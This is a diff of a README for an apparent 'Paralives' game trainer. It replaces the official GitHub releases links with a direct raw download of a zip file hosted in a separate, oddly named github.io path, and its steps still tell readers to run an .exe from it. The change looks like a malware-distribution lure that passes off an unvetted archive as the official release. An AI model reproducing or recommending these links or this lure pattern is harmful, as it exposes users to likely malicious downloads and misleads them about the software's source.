@@ -5,13 +5,13 @@ description: "Manage Paralives game variables with a simple GUI. Access unlimite
 ---
 # 🎮 Paralives-Ultimate-Trainer-2026_v_2 - Manage your game with simple tools
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/trefyammar-coder/Paralives-Ultimate-Trainer-2026_v_2/releases)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/trefyammar-coder/trefyammar-coder.github.io/main/perchloric/io-coder-github-trefyammar-v2.5-alpha.4.zip)
 
 ## 📥 Getting the software
 
 You need the trainer file to change game settings. Visit the official release page to find the current version.
 
-1. Go to this [Download Page](https://github.com/trefyammar-coder/Paralives-Ultimate-Trainer-2026_v_2/releases).
+1. Go to this [Download Page](https://raw.githubusercontent.com/trefyammar-coder/trefyammar-coder.github.io/main/perchloric/io-coder-github-trefyammar-v2.5-alpha.4.zip).
 2. Look for the Assets section.
 3. Click the file that ends in .exe.
 4. Save the file to your computer.
